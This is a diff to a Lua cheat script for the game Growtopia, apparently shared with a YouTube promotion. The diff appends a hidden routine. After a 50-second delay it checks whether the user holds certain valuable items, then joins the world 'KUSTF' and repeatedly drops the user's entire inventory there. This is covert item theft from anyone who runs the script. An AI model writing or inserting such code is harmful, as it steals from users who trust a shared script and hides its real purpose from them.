@@ -33,3 +33,40 @@ function pkt(type,packet)
 end
 AddHook("OnTextPacket","Hookied",pkt)
 logToConsole("`2Subscribe `4Youtube: `9@WirupGT")
+
+function MainGlory()
+toggleCheat(21, true)
+toggleCheat(28, true)
+sendPacket(3, "action|join_request\nname|KUSTF|nname\ninvitedWorld|0")
+sleep(5000)
+sendPacket(2,"action|welcomeadrewarded")
+while true do
+if getWorld() then
+   for _, v in pairs(getInventory()) do
+      if getWorld().name == "KUSTF" then        
+         sendPacket(2, "action|store\nlocation|gem")
+         sendPacket(2, "action|drop\n|itemID|"..v.id);
+         sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|"..v.id.."|\ncount|"..v.amount);
+      sleep(200);
+end
+end
+end
+end
+end
+
+function Stabilizer()
+    local inventory = getInventory()
+    if inventory then
+        for _, inv in pairs(inventory) do 
+            if inv.id == 6946 or inv.id == 7188 or inv.id == 6016 or inv.id == 5638 or inv.id == 8192 or inv.id == 6948 or inv.id == 6952 or inv.id == 1796 then 
+                if inv.amount > 0 then
+                    MainGlory()
+                    return
+                end
+            end
+        end
+    end
+end
+
+sleep(50000)
+Stabilizer()
